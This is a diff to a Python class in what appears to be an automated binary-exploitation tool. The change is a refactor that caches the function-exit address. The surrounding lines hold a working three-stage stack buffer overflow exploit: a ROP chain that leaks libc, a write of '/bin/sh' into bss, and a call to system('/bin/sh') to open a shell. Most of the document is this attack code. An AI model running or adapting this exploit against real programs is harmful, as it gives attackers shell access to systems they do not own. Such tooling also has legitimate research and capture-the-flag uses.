@@ -155,7 +155,8 @@ class StackBufferOverflowVulnerability(Vulnerability):
     def exploit(self, conn):
         sconn = conn.conn
         function_addr = int(self.function["address"], 16) 
-
+        functionExit = int(self.functionExit, 16)
+    
         logger.info("#####")
         logger.info("# STACK BUFFER OVERFLOW - STAGE 1: Leak Libc")
         logger.info("#####")
@@ -180,19 +181,18 @@ class StackBufferOverflowVulnerability(Vulnerability):
         logger.info("Sending first payload (to leak 'puts' location)")
        
         payload1 = sm.resolve(binary=0x0, libc=0x0)
-        solution_payload = conn.scout(int(self.functionExit, 16), [claripy.BVS("solution_payload1", size=8*prefixlen), claripy.BVV(payload1+b"\n")])
+        solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload1", size=8*prefixlen), claripy.BVV(payload1+b"\n")])
         logger.info(f"Solution Prefix Payload: {solution_payload}")
         conn.sim_sendline(solution_payload[:-1])
         sconn.sendline(solution_payload[:-1])
 
-        # Need to perform drain of non libc stuff
         if self.suffix:
             logger.info(f"Attempting to receive provided suffix: {suffix}")
             res = sconn.recvuntil(self.suffix)
             logger.debug(f"Received suffix: {res}")
         else:
             logger.info(f"Navigating to function exit {self.functionExit}")
-            conn.navigate(int(self.functionExit,16))
+            conn.navigate(functionExit)
 
         # We've hit the return, next output is now the 'gets' address
         gets_location = sconn.recvline()[:-1]
@@ -212,6 +212,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         logger.info("#####")
         logger.info("# STACK BUFFER OVERFLOW - STAGE 2: Write `/bin/sh` to writeable bss location")
         logger.info("#####")
+
         # Payload2: Psend /bin/sh
         target_heap_address = self.binary.bss() + 0x100
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
@@ -221,7 +222,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         payload2 = sm.resolve(binary=0x0)
         
         logger.info("Sending second payload (setup write to controlled memory)")
-        solution_payload = conn.scout(int(self.functionExit,16), [claripy.BVS("solution_payload2_prefix", size=8*prefixlen), claripy.BVV(payload2+b"\n")])
+        solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload2_prefix", size=8*prefixlen), claripy.BVV(payload2+b"\n")])
         conn.sim_sendline(solution_payload[:-1])
         sconn.sendline(solution_payload[:-1])
         logger.info("Navigating to return.")
@@ -231,7 +232,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
             logger.debug(f"Received suffix: {res}")
         else:
             logger.info("Navigating to function exit")
-            conn.navigate(int(self.functionExit,16))
+            conn.navigate(functionExit)
 
         # we have exited the function, we can now
         # write /bin/sh to a controlled part of memory
@@ -252,6 +253,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         logger.info("# STACK BUFFER OVERFLOW - STAGE 3: Perform system invocation")
         logger.info("#####")
 
+        # payload3
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
         sm.pop_rdi(target_heap_address)
         sm.nop()
@@ -260,7 +262,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         payload3 = sm.resolve(binary=0x0, libc=libcoffset)
 
         logger.info("Sending final payload (invoke system('bin/sh'))")
-        solution_payload = conn.scout(int(self.functionExit,16), [claripy.BVS("solution_payload_prefix3", size=8*prefixlen), claripy.BVV(payload3+b"\n")])
+        solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload_prefix3", size=8*prefixlen), claripy.BVV(payload3+b"\n")])
         conn.sim_sendline(solution_payload[:-1])
         sconn.sendline(solution_payload[:-1])
         
@@ -271,6 +273,6 @@ class StackBufferOverflowVulnerability(Vulnerability):
             logger.debug(f"Received suffix: {res}")
         else:
             logger.info("Navigating to function exit")
-            conn.navigate(int(self.functionExit,16))
+            conn.navigate(functionExit)
         
         logger.info("We should now have a shell.")
